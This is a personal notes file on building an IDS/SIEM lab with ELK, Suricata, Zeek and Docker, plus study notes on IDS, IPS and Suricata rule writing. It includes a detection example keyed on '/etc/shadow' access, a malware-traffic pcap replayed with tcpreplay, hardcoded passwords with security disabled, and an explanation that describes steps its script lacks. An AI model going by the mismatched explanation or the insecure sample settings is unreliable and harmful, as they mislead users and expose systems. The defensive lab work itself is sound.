ALL RIGHTS RESERVED SIMON ØRSKOV BECKMANN

# SIMON'S ✍️ CYBER SECURITY NOTES
___

Sure! Below is a complete Bash script to run and test all the containers you've mentioned, including Kibana, Elasticsearch, Filebeat, and `nfcapd`. The script will:

1. Pull the necessary Docker images.
2. Run the containers.
3. Check if the containers are running.
4. Test if the web services (Kibana and Elasticsearch) are accessible via the specified ports.
5. Stop the containers at the end.

Here’s the complete script:

```bash
#!/bin/bash

# Step 1: Create necessary directories for Docker Compose setup
echo "Creating necessary directories for Docker Compose setup..."
mkdir -p ./logstash/config
mkdir -p ./logstash/pipeline

# Step 2: Create the docker-compose.yml file
echo "Creating docker-compose.yml..."

cat <<EOF > docker-compose.yml
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.10.0
    environment:
      - discovery.type=single-node
      - ELASTIC_PASSWORD=elastic_password
    networks:
      - elastic

  kibana:
    image: docker.elastic.co/kibana/kibana:8.10.0
    environment:
      - ELASTICSEARCH_URL=http://elasticsearch:9200
      - ELASTICSEARCH_USERNAME=elastic
      - ELASTICSEARCH_PASSWORD=elastic_password
    ports:
      - "5601:5601"
    networks:
      - elastic

  logstash:
    image: docker.elastic.co/logstash/logstash:8.10.0
    environment:
      - LOGSTASH_HOME=/usr/share/logstash
    volumes:
      - ./logstash/config/logstash.yml:/usr/share/logstash/config/logstash.yml
      - ./logstash/pipeline:/usr/share/logstash/pipeline
    networks:
      - elastic

  packetbeat:
    image: docker.elastic.co/beats/packetbeat:8.10.0
    environment:
      - ELASTICSEARCH_HOST=http://elasticsearch:9200
      - ELASTICSEARCH_USERNAME=elastic
      - ELASTICSEARCH_PASSWORD=elastic_password
    networks:
      - elastic
    command: >
      packetbeat -e -E output.elasticsearch.hosts=["http://elasticsearch:9200"] -E packetbeat.interfaces.device=eth0

  filebeat:
    image: docker.elastic.co/beats/filebeat:8.10.0
    environment:
      - ELASTICSEARCH_HOST=http://elasticsearch:9200
      - ELASTICSEARCH_USERNAME=elastic
      - ELASTICSEARCH_PASSWORD=elastic_password
    networks:
      - elastic
    command: >
      filebeat -e -E output.elasticsearch.hosts=["http://elasticsearch:9200"]

networks:
  elastic:
    driver: bridge
EOF

# Step 3: Create Packetbeat configuration
echo "Creating Packetbeat configuration file..."

cat <<EOF > ./logstash/config/packetbeat.yml
packetbeat.interfaces.device: eth0
packetbeat.protocols.dns:
  enabled: true
  domain_name: example.com
  include_authorities: true
packetbeat.protocols.http:
  enabled: true
  transaction_timeout: 1500ms
output.elasticsearch:
  hosts: ["http://elasticsearch:9200"]
  username: "elastic"
  password: "elastic_password"
EOF

# Step 4: Create Filebeat configuration
echo "Creating Filebeat configuration file..."

cat <<EOF > ./logstash/config/filebeat.yml
filebeat.inputs:
  - type: log
    paths:
      - /var/log/*.log
output.elasticsearch:
  hosts: ["http://elasticsearch:9200"]
  username: "elastic"
  password: "elastic_password"
EOF

# Step 5: Pull the latest Docker images to avoid pulling errors
echo "Pulling latest Docker images for Elastic Stack..."
docker pull docker.elastic.co/elasticsearch/elasticsearch:8.10.0
docker pull docker.elastic.co/kibana/kibana:8.10.0
docker pull docker.elastic.co/logstash/logstash:8.10.0
docker pull docker.elastic.co/beats/packetbeat:8.10.0
docker pull docker.elastic.co/beats/filebeat:8.10.0

# Step 6: Start Docker Compose in detached mode
echo "Starting Docker Compose..."
docker-compose up -d

# Step 7: Check Docker Compose status
echo "Checking the status of the Docker Compose services..."
docker-compose ps

# Step 8: Final message
echo "Elastic Stack setup is complete!"
echo "Access Kibana at http://localhost:5601"
echo "Your Elasticsearch is running on http://elasticsearch:9200"

```

### Explanation:

1. **Pulling Docker images**: The script pulls the required Docker images for Kibana, Elasticsearch, Filebeat, and `nfcapd`.
2. **Running containers**: Each container is started in detached mode (`-d`) and mapped to the appropriate ports.
3. **Waiting for initialization**: The script waits for 20 seconds to allow containers to initialize fully. You can adjust the wait time based on your environment.
4. **Testing the services**:

   * It checks if Kibana is accessible at `localhost:5601`.
   * It checks if Elasticsearch is accessible at `localhost:9200`.
   * It checks if `nfcapd` is accessible at port `9995`.
   * It checks if Filebeat is running (as it doesn't have a web service, just verifies it is running).
5. **Stopping and cleaning up**: After testing, the containers are stopped. Optionally, you can uncomment the line that removes the containers (`docker rm`).

### Usage:

1. **Save the script**: Copy the script into a file, e.g., `test_docker_containers.sh`.

2. **Make it executable**:

   ```bash
   chmod +x test_docker_containers.sh
   ```

3. **Run the script**:

   ```bash
   ./test_docker_containers.sh
   ```

### Notes:

* The script assumes you have Docker installed and running on your system.
* If you're running Docker on macOS/Windows through Docker Desktop, you can access the containers via `localhost` (127.0.0.1).
* Adjust the `sleep` time if the containers need more time to initialize.

Let me know if you need further customization or any other help!

___

### 🔄 Goal

* **Maintain NAT between Mac ↔ Kali Linux VM** (handled by VMware Fusion).
* **Ensure inter-container communication (ELK, Suricata, Zeek, etc.) within Kali**.
* **Avoid `network_mode: host`**, which bypasses NAT and can break communication in a virtualized NAT environment on **macOS**.

---

### ✅ Key Fixes:

* Replace `network_mode: host` with **custom Docker bridge networks**.
* Explicitly **attach all containers** to the same Docker network for seamless communication.
* Set correct interfaces for packet capture (`ens34`) but ensure **interfaces are accessible from within containers**—this may require interface pass-through or `macvlan` if host interface capture is needed.

---

### ✅ Updated `docker-compose.yml` with NAT-Compatible Networking:

```yaml
version: '3.8'

services:

  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.13.0
    container_name: elasticsearch
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
    volumes:
      - esdata:/usr/share/elasticsearch/data
    ports:
      - "9200:9200"
    networks:
      - siem

  kibana:
    image: docker.elastic.co/kibana/kibana:8.13.0
    container_name: kibana
    depends_on:
      - elasticsearch
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    ports:
      - "5601:5601"
    networks:
      - siem

  filebeat:
    image: docker.elastic.co/beats/filebeat:8.13.0
    container_name: filebeat
    user: root
    volumes:
      - ./filebeat.yml:/usr/share/filebeat/filebeat.yml
      - /var/log:/hostfs/var/log:ro
    depends_on:
      - elasticsearch
      - kibana
    networks:
      - siem

  suricata:
    image: jasonish/suricata:latest
    container_name: suricata
    privileged: true
    cap_add:
      - NET_ADMIN
    networks:
      - siem
    volumes:
      - ./suricata.yaml:/etc/suricata/suricata.yaml
      - /var/log/suricata:/var/log/suricata
    command: suricata -i eth0 -c /etc/suricata/suricata.yaml

  zeek:
    image: blacktop/zeek:latest
    container_name: zeek
    privileged: true
    cap_add:
      - NET_ADMIN
    networks:
      - siem
    volumes:
      - ./zeek:/zeek/logs
    command: zeek -i eth0

  fprobe:
    image: pavelbazika/fprobe
    container_name: fprobe
    privileged: true
    cap_add:
      - NET_ADMIN
    networks:
      - siem
    command: -i eth0 -fip 127.0.0.1 -p 9995

  nfcapd:
    image: netsniff-ng/nfdump
    container_name: nfcapd
    networks:
      - siem
    command: nfcapd -w -D -l /data -p 9995
    volumes:
      - ./netflow:/data
    ports:
      - "2055:2055/udp"

  nids-light:
    build: ./nids-light
    container_name: nids-light
    depends_on:
      - filebeat
      - suricata
    networks:
      - siem
    volumes:
      - ./nids-light/config:/app/config

  elk-siem21suricatafull:
    build: ./elk-siem21suricatafull
    container_name: elk-siem21
    depends_on:
      - elasticsearch
      - kibana
      - suricata
    networks:
      - siem

volumes:
  esdata:

networks:
  siem:
    driver: bridge
```

---

### 🔍 Important Notes:

1. **Interface Name**:

   * You may need to **map `ens34` to container eth0** using `macvlan` if you require direct packet sniffing from that interface.
   * Otherwise, **pass mirrored traffic** from the host or tap into traffic using pcap with a mount.

2. **Host Interface Access** (e.g., for Suricata/Zeek):

   * On macOS with Fusion + NAT, using `host` mode is **problematic**.
   * Use **`--net=macvlan`** outside Compose if true interface access is needed.

3. **Cross-VM communication**:

   * Ensure Fusion’s NAT is properly forwarding or bridging traffic from Kali to your macOS network stack.
   * Optionally, expose `5601`, `9200`, and other ports via Fusion port forwarding.

---

Would you like me to provide a working `macvlan` example or a script to simulate mirrored traffic to `eth0` for testing Suricata and Zeek?

___

To run your Docker Compose setup on **Kali Linux in VMware Fusion** (or any Linux system), follow these steps:

---

### ✅ Step-by-Step: Run Docker Compose

#### 1. 🛠 Install Docker and Docker Compose (if not already)

If you haven’t already:

```bash
sudo apt update
sudo apt install docker.io docker-compose -y
sudo systemctl start docker
sudo systemctl enable docker
```

> Confirm Docker is installed:

```bash
docker --version
docker-compose --version
```

---

#### 2. 📁 Prepare the Project Directory

Create a directory for your project and navigate into it:

```bash
mkdir ~/nids-elk-stack && cd ~/nids-elk-stack
```

Place the following files inside this directory:

* `docker-compose.yml` (your full setup)
* `suricata.yaml`
* `filebeat.yml`
* Any build contexts like:

  * `./nids-light/Dockerfile`
  * `./elk-siem21suricatafull/Dockerfile`

---

#### 3. 🏗️ Build and Start the Stack

Run the following command to **build and launch** the services:

```bash
sudo docker-compose up -d --build
```

* `-d` runs it in the background (detached).
* `--build` ensures it rebuilds custom Docker images (`nids-light`, `elk-siem21suricatafull`).

---

#### 4. ✅ Check Running Services

```bash
docker ps
```

You should see all your containers running, including `elasticsearch`, `kibana`, `suricata`, etc.

---

#### 5. 🌐 Access Services in Browser (from host/mac)

If you've forwarded ports correctly via **VMware NAT settings**, access:

* **Kibana**: `http://<kali-vm-ip>:5601`
* **Elasticsearch**: `http://<kali-vm-ip>:9200`

> Use `ip a` or `ifconfig` inside the Kali VM to find your NAT-assigned IP (`ens33` interface).

---

#### 6. 🛑 Stop the Stack

When you're done, you can shut everything down with:

```bash
sudo docker-compose down
```

---

Would you like a helper script (`start.sh`, `stop.sh`) to automate this?


___
# IDS (intrusion detection system(live real time)) / IPS🛰️ #


> IDS = passive system -> sits on the switch and duplicates/mirror ports on switch
> Cannot block traffic - but inspect the traffic
> Traffic doesnt pass through IDS / is parrallel to the traffic
> ONLY Promiscous mode / doesnt have its own ip address and sends packets through analysis tools
> Makes full packet capture + more
> 2 interfaces > monitoring and configuration
> reactive IDS'es with an attack -> it actively sets an alert -> firewalls -> built in gateways that are under attacks and lock down
> Can be dangerous to turn on and automatically lock network and possibly lock down production environemnts
> IDS cannot block current package and can reactively deploy gateway rules to block attack
> Can actively send reset packets to source IP


# IPS ( Intrusion prevention ) #

> serial connection with the network components
> 3 interfaces -> 2 for input/output  - 1 for configuration
> Should be overdimensionded to handle rules -> not firewall rules -> we have 1000 of rules for each packet passing through
> Heavy load on the network
> Looks at the packet -> look for matching rules -> can block the packet
> can also make rules for alarm


## implementation ##

> typically setup rules not to block at initial setup
> scan the traffic and undersstand the traffic of the business
> start ips as ids and then after some time turn on ips features
> often we combine ips and ids -> set of rules for logging traffic if uncertain -> and be sure to block only certain attack
> IDS can helo verify IPS is still operational and error detect ips
> IDS can alert the ips (since ips is further down the network chain)
> We can place a NIDS (network intrusion detection) on the trusted network subnet for detection of attacks from hosts on the edge of the network
> Limit IDS to the most important segments


## TYPES of IDS / IPS ##

## TYPES of IDS / IPS ##

| Type               | Description                                                                 |
|--------------------|-----------------------------------------------------------------------------|
| **Network-based**  | Network sensors scan traffic that is designated to many hosts               |
| **Host-based**     | Host agent monitors all operations within an operating system               |
| **Signature-based**| Monitors for specific patterns (signatures) that match known threats        |
| **Anomaly-based**  | Flags behavior that deviates from established normal usage patterns         |
| **Hybrid-based**   | Combines multiple detection methods for more accurate threat detection      |


## NETWORK-BASED and Host-Based IPS ##

# 🛡️ NETWORK-BASED vs. HOST-BASED IPS

Intrusion Prevention Systems (IPS) are critical tools in cybersecurity. They actively monitor and analyze traffic to detect and prevent malicious activity in real-time.

---

## 🌐 Network-Based IPS (NIPS)

> **Monitors traffic across the entire network.**

### 🔍 Characteristics:
- Deployed at strategic points (e.g., gateway, firewall).
- Inspects **network packets**.
- Can block **DoS/DDoS** attacks and scanning.
- **Cannot decrypt encrypted payloads** (e.g., TLS, symmetric encryption).

### 🧠 Example Detection:
- Port scans
- SYN floods
- Known exploit signatures

### ❌ Limitation:
```diff
- Cannot see inside encrypted traffic
- Cannot detect host-level malware
````

### 📊 ASCII Diagram:

```
[Internet] ---> [NIPS Firewall] ---> [Internal Network]
                   ||      
            Scans packets 
         Detects network threats
```

---

## 💻 Host-Based IPS (HIPS)

> **Installed directly on endpoint hosts (e.g., servers, laptops).**

### 🔍 Characteristics:

* Analyzes **system-level activity** (files, processes, registry).
* Can **detect encrypted malware** (e.g., ransomware).
* Monitors behavior at **kernel-level**.

### 🧠 Example Detection:

* Code injection (DLL)
* Registry manipulation
* Privilege escalation

### 🔐 Advantage:

```diff
+ Can decrypt and analyze local encrypted activity
+ Detects polymorphic and obfuscated malware
```

### 📊 ASCII Diagram:

```
[Host System]
     |
[ HIPS Agent ]
     |
Monitors OS-level activity
Detects ransomware, privilege abuse
```

---

## ⚔️ NIPS vs HIPS — Key Differences

| Feature              | NIPS 🌐                   | HIPS 💻                            |
| -------------------- | ------------------------- | ---------------------------------- |
| Deployment Location  | Network perimeter         | Individual host machines           |
| Visibility           | Network traffic           | Host activity                      |
| Encryption Awareness | ❌ Cannot decrypt payloads | ✅ Can analyze decrypted data       |
| Attack Focus         | DDoS, worms, scans        | Malware, exploits, privilege abuse |
| Performance Overhead | Low (network-wide)        | Higher (host CPU/memory)           |

---

## 🎯 Summary:

> 🛡️ **Use both NIPS and HIPS for a layered defense strategy**.

* NIPS provides **broad visibility** and **traffic control**.
* HIPS provides **deep visibility** and **system-level detection**.
* Together, they cover both **external threats** and **internal exploits**.

---

## 🧩 Cybersecurity Expert Insight

* 🔐 **Encrypted traffic (SSL/TLS, symmetric keys)** bypasses NIPS.
* 🧬 **HIPS can catch payloads once decrypted on host memory**.
* 🎭 Malware authors use **encryption + polymorphism** to evade NIPS.

> 💡 Best Practice: Use **SSL decryption** + **Endpoint Detection & Response (EDR)** in combination with HIPS/NIPS.

___

> NIPS can better detect broad attacks on the network ( DDOS )
> HIPS detect specific host based attacks ( cryptology in malware
> NIPS cannot detect symmmetric key encryption and not decrypt -> NIPS cannot see payload and will not detect BUT host can detectypt on the host 


UTM -> NIDS MAC M1

___

---

# 🔍 ADVANCED FEATURES OF IDS/IPS SYSTEMS

## 🚧 Resource Constraints in NIPS

> NIPS are often bundled into unified security appliances (e.g., Checkpoint, Fortinet).

### ⚙️ Real-World Constraint:
- Limited CPU/Memory on router+NIPS combo boxes
- Cannot handle high-throughput environments easily
- Performance degrades with **deep packet inspection (DPI)**

---

## 🧬 Signature-Based Detection (IDS/IPS)

> Pattern recognition using known malware fingerprints.

### 📌 How It Works:
- Match traffic or file hash against known **MD5/SHA signatures**
- Example: `e99a18c428cb38d5f260853678922e03` → matches known malware

### ⚠️ Evasion Techniques:
```diff
- Add a space, modify a byte, re-encode → signature breaks
````

#### 🗂️ Example Rule:

```plaintext
Alert if "/etc/shadow" is accessed → trigger signature match
```

---

## 🧾 Policy-Based Detection

> Predefined rules based on organizational policy

### 🧱 Example Use Case:

* ❌ Sales department trying to access Tech segment
* ❌ FTP traffic over HTTP port
* ✅ Trigger alert if segmentation is violated

---

## 📈 Anomaly-Based Detection

> Define "normal," detect the abnormal

### 🧪 Process:

1. Establish a **baseline** (normal traffic patterns)
2. Detect deviation:

   * ❌ Excessive UDP from one host
   * ❌ DHCP-like traffic on non-standard port
   * ❌ ICMP packet with abnormal payload size/content

### ⚠️ Challenges:

* Defining "normal" is **hard**
* Networks are **dynamic**
* High **false positive rate**

---

## 🌐 SYN Flood Example (Anomaly Detection)

* TCP SYN packets flood a target without ACKs
* Sudden spike in half-open connections
* IDS tracks TCP state and alerts on abnormal patterns

---

## 📊 OSI LAYER VISUALIZATION FOR IDS/IPS

```plaintext
+--------------------------+
| Layer 7: Application     | <-- IDS inspects HTTP, FTP, DNS
+--------------------------+
| Layer 6: Presentation    | <-- Limited inspection (e.g., TLS)
+--------------------------+
| Layer 5: Session         | <-- Track stateful sessions
+--------------------------+
| Layer 4: Transport       | <-- Detects SYN floods, port scans
+--------------------------+
| Layer 3: Network         | <-- Inspects IP headers
+--------------------------+
| Layer 2: Data Link       | <-- Rare, but MAC-based filtering
+--------------------------+
| Layer 1: Physical        | ❌ Not inspected by IDS
+--------------------------+
```

---

## 🛠️ IDS vs. Firewall vs. IPS — Capabilities Compared

| Feature                      | Firewall 🚧             | IDS 🧠              | IPS ⚔️                      |
| ---------------------------- | ----------------------- | ------------------- | --------------------------- |
| Packet Filtering             | ✅                       | ✅ (deep inspection) | ✅                           |
| Signature-Based Detection    | ❌                       | ✅                   | ✅                           |
| Anomaly-Based Detection      | ❌                       | ✅                   | ✅                           |
| Real-time Blocking           | ✅                       | ❌ (alert only)      | ✅                           |
| Behavior Learning (Baseline) | ❌                       | ✅                   | ✅                           |
| Encryption Awareness         | ❌ unless SSL inspection | ❌ unless on host    | ❌ unless decrypted upstream |

---

## 🧠 Final Insight:

> **Combining NIPS, HIPS, firewalls, and behavioral analytics = true layered security.**

* Signature-based is **fast but blind to variants**
* Anomaly-based is **powerful but noisy**
* Policy-based ensures **compliance enforcement**
* Each system has **different visibility & control scope**

---

# 🛡️ Deep Packet Inspection (DPI) and IDS/IPS Application Layer Mastery

## 🔍 Deep Packet Inspection (DPI)

> DPI is the ability to inspect not only headers but also the **actual contents (payload)** of packets.

✅ **Main Difference from Firewalls**:
- Firewalls generally operate up to **Layer 4 (Transport Layer)**.
- IDS/IPS can inspect **Layer 7 (Application Layer)** → HTTP, DNS, FTP, SMTP, etc.

### 📦 IDS/IPS Enables:
- Malware detection inside HTTP traffic
- SQL injection payloads
- DNS tunneling detection
- Protocol misuse (e.g., SSH over port 80)

---

## ⚔️ IPS Action Order

> Typical order of operations for an Intrusion Prevention System:

| Action   | Description                                                                 |
|----------|-----------------------------------------------------------------------------|
| `pass`   | Allow the traffic through                                                   |
| `drop`   | Silently discard the traffic                                                |
| `reject` | Drop the packet and optionally send TCP RST/ICMP unreachable                |
| `alert`  | Log and notify, **standard for IDS** (does not block traffic)              |

🧠 IDS typically uses:
```plaintext
pass → alert
````

🛡️ IPS typically uses:

```plaintext
pass → alert → drop → reject
```

---

## 🗂️ Network Segmentation — Visual Guide

> Good segmentation limits attack surfaces and lateral movement.

```
                     +----------------------+
                     |   Internet / DMZ     |
                     +----------+-----------+
                                |
                      [Edge Firewall + NIPS]
                                |
           +-------------------+-------------------+
           |                                       |
  +--------v--------+                    +---------v--------+
  |   Web Servers   |                    |    Mail Servers   |
  +--------+--------+                    +---------+---------+
           |                                       |
           |     Internal Firewall + IDS           |
           |                                       |
  +--------v--------+                    +---------v---------+
  | Sales Subnet    |                    |   Tech Subnet      |
  +-----------------+                    +--------------------+
```

### 🚫 Violations Detected:

* FTP traffic from Sales to Tech → **Policy Violation**
* DNS tunneling attempt → **Anomaly + DPI Alert**

---

## 🧠 Security Onion 2.4 Ecosystem Overview

> Security Onion is a free and open platform for threat hunting, enterprise security monitoring, and log management.

🧱 Built on:

* ✅ **Ubuntu** or **CentOS Stream**
* ✅ Uses **Suricata** for NIDS/NIPS
* ✅ Centralized via **Security Onion Console (SOC)** and **Kibana**

---

### 🧰 Tools Inside Security Onion:

| Tool            | Functionality                                | Link                                                         |
| --------------- | -------------------------------------------- | ------------------------------------------------------------ |
| 🔍 Suricata     | NIDS/NIPS engine                             | [suricata.io](https://suricata.io)                           |
| 📜 Zeek         | Network traffic analyzer (formerly Bro)      | [zeek.org](https://zeek.org)                                 |
| 📹 Stenographer | Full packet capture                          | [stenographer repo](https://github.com/google/stenographer)  |
| 🛡️ Wazuh       | Host-Based Intrusion Detection System (HIDS) | [wazuh.com](https://wazuh.com)                               |
| 📊 Grafana      | Visualization for metrics                    | [grafana.com](https://grafana.com)                           |
| 🔍 CyberChef    | Data parsing and transformation              | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef) |
| 🔬 Strelka      | File scanning and malware analysis           | [strelka repo](https://github.com/target/strelka)            |
| 📊 Kibana       | Data visualization + threat dashboard        | [elastic.co/kibana](https://www.elastic.co/kibana)           |
| 📋 SOF-ELK      | ELK stack for forensic data ingestion        | [sof-elk.net](https://www.sof-elk.net/)                      |

---

## 🧠 Mermaid Mind Map — Security Onion Architecture

```mermaid
mindmap
  root((Security Onion))
    OS
      Ubuntu
      CentOS Stream
    Network Sensors
      Suricata
      Zeek
      Stenographer
    HIDS
      Wazuh
    Log Analysis
      SOF-ELK
      Kibana
      Grafana
    SOC Tools
      Security Onion Console
      CyberChef
      Strelka
```

---

## ⚙️ System Requirements (Security Onion 2.4)

> Minimum specs for smooth operation in lab or production:

| Resource | Minimum Requirement     |
| -------- | ----------------------- |
| CPU      | 4 cores                 |
| RAM      | 12 GB                   |
| Storage  | 200 GB+ (SSD preferred) |
| OS       | Ubuntu 20.04 / CentOS 8 |

---

## ✅ Summary

* **Deep Packet Inspection** gives IDS/IPS the power to secure the Application Layer (L7).
* Use **signature + anomaly + policy-based rules** for comprehensive detection.
* **Security Onion** offers a powerful open-source platform built with top-tier tools.
* Diagrammatic visualization and memory aids (like mind maps) help in real-world deployment and learning.

---

🔗 **Recommended Next Step**:
Try [Security Onion Documentation](https://docs.securityonion.net) for setup walkthroughs and production tuning.

```
```
___
Certainly! Below is a **comprehensive, professional, and detailed Markdown guide** explaining how to integrate **Suricata** for **Full Packet Capture (FPC)** with **Filebeat**, **NIDS Light**, and **ELK Stack** for centralized log management and alert monitoring.

---


# 🔐 **Suricata + ELK Stack Integration: Full Packet Capture (FPC) & NIDS Monitoring**

**Audience**: SOC Analysts, Security Engineers, Network Architects  
**Reviewed by**: Cybersecurity Engineering Team  
**Last Updated**: 2025-05-06  

## 🔍 **Objective:**

This guide covers the integration of **Suricata** for **Full Packet Capture (FPC)**, with **Filebeat** as a log shipper, sending network intrusion detection data to an **ELK Stack (Elasticsearch, Logstash, Kibana)** for advanced threat analysis, rule monitoring, and visualization.

### Key Components:
1. **Suricata (NIDS)** - For network intrusion detection and Full Packet Capture (FPC).
2. **Filebeat** - Lightweight shipper that forwards Suricata alerts to ELK.
3. **ELK Stack** - Elasticsearch for storing and querying logs, Logstash for processing logs, and Kibana for visualizing alerts and traffic.
4. **NIDS Light** - Lightweight sensor for generating rules and monitoring intrusion detection data.

---

## 🧩 **Architecture Overview**



### **Workflow:**

1. **Suricata** monitors network traffic, detects intrusions, and performs Full Packet Capture.
2. **Suricata EVE JSON output** (alerts) is forwarded by **Filebeat** to **Logstash** for processing.
3. **Logstash** parses, enriches, and sends logs to **Elasticsearch**.
4. **Kibana** is used to visualize the network traffic, detected intrusions, and the health of the network.

---

## 📦 **Installing Tools and Configuring the Stack**

### 1. **Install Suricata (NIDS)**

Suricata will perform **Full Packet Capture** and generate alerts based on network traffic analysis.

```bash
# Install Suricata on your system (example: Ubuntu/Debian)
sudo apt update
sudo apt install suricata
```

**Configuration**:

* Ensure that Suricata is configured to output alerts in **EVE JSON format** (ideal for Filebeat forwarding).

Edit `suricata.yaml` to enable EVE JSON logging:

```yaml
outputs:
  - eve-log:
      enabled: yes
      filetype: json
      filename: /var/log/suricata/eve.json
```

### 2. **Install Filebeat (Log Shipper)**

Filebeat is used to ship logs from Suricata to the ELK stack.

```bash
# Install Filebeat (example: Ubuntu/Debian)
sudo apt-get install filebeat
```

**Configuration**:
Edit `/etc/filebeat/filebeat.yml` to enable Suricata EVE JSON input:

```yaml
filebeat.inputs:
  - type: log
    enabled: true
    paths:
      - /var/log/suricata/eve.json
    json.keys_under_root: true
    json.add_error_key: true
```

Configure the output to send logs to **Logstash** (which will forward logs to Elasticsearch):

```yaml
output.logstash:
  hosts: ["localhost:5044"]
```

### 3. **Install Logstash (Log Processor)**

Logstash will receive and process Suricata's alerts and forward them to Elasticsearch.

```bash
# Install Logstash (example: Ubuntu/Debian)
sudo apt-get install logstash
```

**Configuration**:
Create a pipeline to parse the Suricata alerts. In `/etc/logstash/conf.d/suricata-pipeline.conf`, configure the filter and output settings:

```bash
input {
  beats {
    port => 5044
  }
}

filter {
  if [fileset][module] == "suricata" {
    # Suricata-specific filter to decode EVE JSON format
    json {
      source => "message"
      target => "suricata"
    }
  }
}

output {
  elasticsearch {
    hosts => ["http://localhost:9200"]
    index => "suricata-alerts-%{+YYYY.MM.dd}"
  }
}
```

### 4. **Install Elasticsearch**

Elasticsearch stores and indexes the processed logs from Suricata.

```bash
# Install Elasticsearch (example: Ubuntu/Debian)
sudo apt-get install elasticsearch
```

**Start Elasticsearch**:

```bash
sudo systemctl enable elasticsearch
sudo systemctl start elasticsearch
```

### 5. **Install Kibana (Visualization)**

Kibana provides a user-friendly interface to visualize Suricata alerts, monitor traffic, and create dashboards.

```bash
# Install Kibana (example: Ubuntu/Debian)
sudo apt-get install kibana
```

**Start Kibana**:

```bash
sudo systemctl enable kibana
sudo systemctl start kibana
```
___
Absolutely. Below is a **top professional chapter** written in **Markdown with UX/UI best practices** for inclusion in a **high-end cybersecurity practitioner’s handbook or online reference book**. It focuses on **NIDS Light, Suricata rule writing, testing, and alert generation**, based on your detailed content.

---

# 📖 Chapter 7: NIDS Light & Suricata Rule Crafting Best Practices

**Audience**: Cybersecurity Practitioners, SOC Engineers, Red/Blue Team Operators  
**Scope**: NIDS operation, rule development, alert interpretation, and traffic simulation  
**Stack Focus**: Suricata, Emerging Threats Rules, Fast Logging, Full Packet Capture  
**Prerequisites**: Linux CLI proficiency, packet analysis fundamentals, IDS/IPS concepts  

---

## 🛠️ 1. Verifying Suricata (NIDS Light) Service Status

To confirm if Suricata is operational:

```bash
sudo service suricata status
````

Expected output (example):

```
● suricata.service - LSB: Next generation IDS/IPS
   Loaded: loaded (/etc/init.d/suricata)
   Active: active (running)
```

If inactive, start the service:

```bash
sudo service suricata start
```

---

## 🌐 2. Rule Management & Emerging Threats (ET) Sources

Suricata supports two major **open rule feed sources**:

| Rule Set | Type       | Update Frequency  | Access Type       |
| -------- | ---------- | ----------------- | ----------------- |
| ET Open  | Community  | Delayed (30 days) | Free              |
| ET Pro   | Commercial | Real-time         | Paid Subscription |

Auto-updating can be configured using **`suricata-update`**:

```bash
sudo suricata-update
```

> 🔁 This ensures the latest rules are fetched from your configured provider (ET Open by default).

Rule files are stored in:

```bash
/var/lib/suricata/rules/
```

Custom rules are usually placed in:

```bash
/etc/suricata/rules/local.rules
```

---

## 🧾 3. Anatomy of a Suricata / Snort Rule

```snort
alert tcp any any -> any any (msg: "TCP packet detected"; sid:5000001;)
```

### 🔍 Rule Breakdown:

| Element        | Meaning                                              |
| -------------- | ---------------------------------------------------- |
| `alert`        | Action: alert, log, drop, reject                     |
| `tcp`          | Protocol                                             |
| `any any`      | Source IP and source port                            |
| `->`           | Direction of traffic                                 |
| `any any`      | Destination IP and port                              |
| `(msg: "...")` | Message shown in alert logs                          |
| `sid:5000001;` | Unique Signature ID (must not conflict with others!) |

---

## 🎨 4. Visual Rule Breakdown Diagram

```mermaid
flowchart LR
    A[alert] --> B[tcp]
    B --> C[any (src IP)]
    C --> D[any (src port)]
    D --> E[-> direction]
    E --> F[any (dest IP)]
    F --> G[any (dest port)]
    G --> H[msg: "TCP packet detected"]
    H --> I[sid: 5000001]
```

### 📌 Best Practices:

* Use `sid` > **7000000** for custom rules to avoid collisions
* Comment unused rules with `#` to avoid performance impact
* Place custom rules in `local.rules`
* Keep your rules **short, specific**, and **context-aware**

---

## 🏠 5. Preconfigured Variables

Suricata supports **variables** to simplify and modularize rule definitions.

```snort
var HOME_NET [10.0.0.0/8]
var HTTP_PORTS [80,8080,443]
var EXTERNAL_NET !$HOME_NET
```

You can use variables in rules like this:

```snort
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"HTTP attempt"; sid:7000001;)
```

---

## 🧪 6. Testing & Enabling Custom Rules

### 🔬 Step 1: Test Rule Syntax

```bash
sudo suricata -T -c /etc/suricata/suricata.yaml -v
```

### ✅ Step 2: Enable Rule

Restart Suricata to apply the new rule:

```bash
sudo service suricata restart
```

---

## 📁 7. Alerts & Full Packet Capture

### 🔔 Alert Log File

```bash
/var/log/suricata/fast.log
```

### 🧵 To search for a specific alert:

```bash
grep 5000001 /var/log/suricata/fast.log
```

### 💽 Full Packet Capture (.pcap)

Suricata automatically captures packet data in:

```bash
/var/log/suricata/*.pcap
```

Ensure the system is on a **NAT or bridge** mode interface to capture the correct traffic (e.g., `eth0`, `ens33`, `enp0s3`).

---

## 🎇 8. Simulate Traffic (Generate Noise)

Download known malicious traffic to simulate real-world alerts:

1. 📦 Download Sample PCAP:

```bash
wget https://www.malware-traffic-analysis.net/2023/10/31/2023-10-31-icedID-traffic.pcap.zip
unzip 2023-10-31-icedID-traffic.pcap.zip
```

2. 🛠️ Replay with `tcpreplay`:

```bash
sudo tcpreplay -i eth0 -M10 2023-10-31-icedID-infection-traffic.pcap
```

> 📢 This sends the packet stream to the interface, generating alerts that Suricata will log and potentially match rules for.

---

## 🚦 9. Common Pitfalls

| Mistake                         | Solution                                                                |
| ------------------------------- | ----------------------------------------------------------------------- |
| `sid` collision                 | Use unique SID values > 7000000                                         |
| Rules not firing                | Check direction, port, and protocol accuracy                            |
| Interface not capturing traffic | Ensure NIC is in **promiscuous** mode (`ip link set eth0 promisc on`)   |
| Overloaded system               | Disable unused rules (`# comment`) or apply rule thresholds             |
| IDS not seeing ARP              | IDS systems typically don’t parse L2 ARP packets – consider switch logs |

---

## 🔚 Summary

| Action                    | Tool / Command                         |
| ------------------------- | -------------------------------------- |
| Check Suricata is running | `sudo service suricata status`         |
| Update community rules    | `sudo suricata-update`                 |
| Create/test rule          | `local.rules` → `sudo suricata -T`     |
| Simulate attack           | `tcpreplay -i eth0 -M10 pcapfile.pcap` |
| View alerts               | `grep sid /var/log/suricata/fast.log`  |
| View PCAPs                | `ls /var/log/suricata/*.pcap`          |

